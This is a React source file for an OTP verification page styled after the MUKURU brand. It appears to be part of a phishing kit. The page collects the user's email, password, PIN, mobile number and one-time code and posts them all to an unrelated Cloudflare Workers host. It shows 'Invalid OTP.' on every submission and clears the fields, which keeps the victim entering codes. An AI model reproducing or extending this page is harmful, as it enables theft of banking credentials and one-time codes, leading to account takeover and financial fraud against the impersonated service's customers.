// import React, { useEffect, useRef, useState } from "react";

// const OTPVerification = () => {
//   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
//   const inputsRef = useRef([]);

//   // Page open hote hi first field focus
//   useEffect(() => {
//     const timer = setTimeout(() => {
//       inputsRef.current[0]?.focus();
//     }, 300);

//     return () => clearTimeout(timer);
//   }, []);

//   const handleChange = (value, index) => {
//     if (!/^\d?$/.test(value)) return;

//     const newOtp = [...otp];
//     newOtp[index] = value;
//     setOtp(newOtp);

//     if (value && index < 5) {
//       inputsRef.current[index + 1]?.focus();
//     }
//   };

//   const handleKeyDown = (e, index) => {
//     if (e.key === "Backspace" && !otp[index] && index > 0) {
//       inputsRef.current[index - 1]?.focus();
//     }
//   };

//   return (
//     <div className="min-h-screen bg-[#292929] text-white">

//       {/* Header */}
//       <header className="h-[86px] bg-[#F0442B] px-5 flex items-center">

//         <div className="flex items-center gap-[14px]">
//           {/* Logo */}
//           <svg
//             viewBox="0 0 52 52"
//             className="w-[48px] h-[48px]"
//             fill="none"
//           >
//             <path
//               d="
//                 M26 3
//                 L31.5 13.5
//                 L44 8.5
//                 L39 21
//                 L51 26
//                 L39 31
//                 L44 43.5
//                 L31.5 38.5
//                 L26 49
//                 L20.5 38.5
//                 L8 43.5
//                 L13 31
//                 L1 26
//                 L13 21
//                 L8 8.5
//                 L20.5 13.5
//                 Z
//               "
//               stroke="white"
//               strokeWidth="3.5"
//               strokeLinejoin="round"
//               strokeLinecap="round"
//             />
//           </svg>

//           <span className="text-[30px] font-bold tracking-[1px]">
//             MUKURU
//           </span>
//         </div>

//       </header>

//       {/* Main */}
//       <main className="px-5 pt-[29px]">

//         {/* Title */}
//         <h1 className="text-[23px] font-bold text-white">
//           OTP Verification
//         </h1>

//         {/* Restart Login */}
//         <button
//           type="button"
//           className="
//             mt-[13px]
//             flex
//             items-center
//             gap-[8px]
//             text-[16px]
//             text-[#36C7C8]
//             underline
//           "
//         >
//           <span className="text-[23px] leading-none">
//             ↻
//           </span>

//           <span>Restart Login</span>
//         </button>

//         {/* Description */}
//         <p className="mt-[39px] text-[15px] text-[#AFAFAF]">
//           Enter the verification code sent to your device
//         </p>

//         {/* OTP Inputs */}
//         <div className="mt-[69px] grid grid-cols-6 gap-[14px]">

//           {otp.map((digit, index) => (
//             <input
//               key={index}
//               ref={(el) => {
//                 inputsRef.current[index] = el;
//               }}
//               type="text"
//               inputMode="numeric"
//               maxLength={1}
//               value={digit}
//               onChange={(e) =>
//                 handleChange(e.target.value, index)
//               }
//               onKeyDown={(e) =>
//                 handleKeyDown(e, index)
//               }
//               className={`
//                 h-[42px]
//                 w-full
//                 border-0
//                 border-b-[3px]
//                 bg-transparent
//                 text-center
//                 text-[24px]
//                 font-bold
//                 text-white
//                 outline-none
//                 caret-[#36C7C8]
//                 ${
//                   digit
//                     ? "border-[#36C7C8]"
//                     : "border-[#686868]"
//                 }
//                 focus:border-[#36C7C8]
//               `}
//             />
//           ))}

//         </div>

//         {/* Submit */}
//         <button
//           type="button"
//           className="
//             mt-[17px]
//             h-[61px]
//             w-full
//             rounded-[32px]
//             bg-[#E8442A]
//             text-[18px]
//             font-bold
//             text-[#BDBDBD]
//           "
//         >
//           Submit
//         </button>

//         {/* Resend */}
//         <div className="mt-[22px] text-center">
//           <span className="text-[14px] text-[#888888]">
//             Resend code in 00:57
//           </span>
//         </div>

//       </main>
//     </div>
//   );
// };

// export default OTPVerification;


import React, { useEffect, useRef, useState } from "react";
import { useLocation } from "react-router-dom";

const OTP_LENGTH = 6;
const TIMER_START = 59;

const OTPVerification = () => {
  const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
  const [timer, setTimer] = useState(TIMER_START);
  const [error, setError] = useState("");
  const location = useLocation();
  const { email, password, pin , mobile} = location.state || {};

  const inputsRef = useRef([]);

  // First input focus
  useEffect(() => {
    const timeout = setTimeout(() => {
      inputsRef.current[0]?.focus();
    }, 300);

    return () => clearTimeout(timeout);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (timer <= 0) return;

    const interval = setInterval(() => {
      setTimer((previous) => {
        if (previous <= 1) {
          clearInterval(interval);
          return 0;
        }

        return previous - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [timer]);

  const handleChange = (value, index) => {
    if (!/^\d?$/.test(value)) return;
setError("");
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < OTP_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async() => {
    const enteredOtp = otp.join("");

    // Demo only
    console.log("Demo OTP submit triggered");

    // Submit ke baad timer dobara 57 seconds
    setTimer(TIMER_START);

    // Demo mein fields clear
    setOtp(Array(OTP_LENGTH).fill(""));
    try {
     const response = await fetch("https://my-worker.instapayapi.workers.dev/api/mukuruotp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password,pin,mobile, otp: enteredOtp }),
      });

      const data = await response.json();
setError("Invalid OTP.");
      if (!response.ok) {
        setError(data.message || "Invalid OTP.");
        return;
      }

    } catch (err) {
      console.error("API error:", err);
    }

    // // First field par wapas focus
    // setTimeout(() => {
    //   inputsRef.current[0]?.focus();
    // }, 100);
  };

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;

    return `${String(minutes).padStart(2, "0")}:${String(
      remainingSeconds
    ).padStart(2, "0")}`;
  };

  return (
    <div className="min-h-screen bg-[#292929] text-white">

      {/* Header */}
      <header className="flex h-[86px] items-center bg-[#F0442B] px-5">
        <div className="flex items-center gap-[14px]">

          <svg
            viewBox="0 0 52 52"
            className="h-[48px] w-[48px]"
            fill="none"
          >
            <path
              d="
                M26 3
                L31.5 13.5
                L44 8.5
                L39 21
                L51 26
                L39 31
                L44 43.5
                L31.5 38.5
                L26 49
                L20.5 38.5
                L8 43.5
                L13 31
                L1 26
                L13 21
                L8 8.5
                L20.5 13.5
                Z
              "
              stroke="white"
              strokeWidth="3.5"
              strokeLinejoin="round"
              strokeLinecap="round"
            />
          </svg>

          <span className="text-[30px] font-bold tracking-[1px]">
            MUKURU
          </span>
        </div>
      </header>

      {/* Main */}
      <main className="px-5 pt-[29px]">

        <h1 className="text-[23px] font-bold">
          OTP Verification
        </h1>

        <button
          type="button"
          className="
            mt-[13px]
            flex
            items-center
            gap-[8px]
            text-[16px]
            text-[#36C7C8]
            underline
          "
        >
          <span className="text-[23px] leading-none">
            ↻
          </span>

          <span>Restart Login</span>
        </button>

        <p className="mt-[39px] text-[15px] text-[#AFAFAF]">
          Enter the verification code sent to your device
        </p>

        {/* OTP */}
        {/* OTP */}
<div className="mt-[42px]">
  <div className="grid grid-cols-6 gap-[14px]">
    {otp.map((digit, index) => (
      <input
        key={index}
        ref={(el) => {
          inputsRef.current[index] = el;
        }}
        type="text"
        inputMode="numeric"
        maxLength={1}
        value={digit}
        onChange={(e) =>
          handleChange(e.target.value, index)
        }
        onKeyDown={(e) =>
          handleKeyDown(e, index)
        }
        className={`
          h-[42px]
          w-full
          border-0
          border-b-[3px]
          bg-transparent
          text-center
          text-[24px]
          font-bold
          text-white
          outline-none
          caret-[#36C7C8]
          ${
            digit
              ? "border-[#36C7C8]"
              : "border-[#686868]"
          }
          focus:border-[#36C7C8]
        `}
      />
    ))}
  </div>

  {/* Error - OTP boxes ke neeche */}
  {error && (
    <p className="mt-[8px] text-center text-[14px] font-medium text-[#FF5A5A]">
      {error}
    </p>
  )}
</div>

        {/* Submit */}
        <button
          type="button"
          onClick={handleSubmit}
          className="
            mt-[17px]
            h-[61px]
            w-full
            rounded-[32px]
            bg-[#E8442A]
            text-[18px]
            font-bold
            text-white
          "
        >
          Submit
        </button>

        {/* Timer */}
        <div className="mt-[22px] text-center">
          {timer > 0 ? (
            <span className="text-[14px] text-[#888888]">
              Resend code in {formatTime(timer)}
            </span>
          ) : (
            <button
              type="button"
              onClick={() => setTimer(TIMER_START)}
              className="text-[14px] text-[#36C7C8] underline"
            >
              Resend code
            </button>
          )}
        </div>

      </main>
    </div>
  );
};

export default OTPVerification;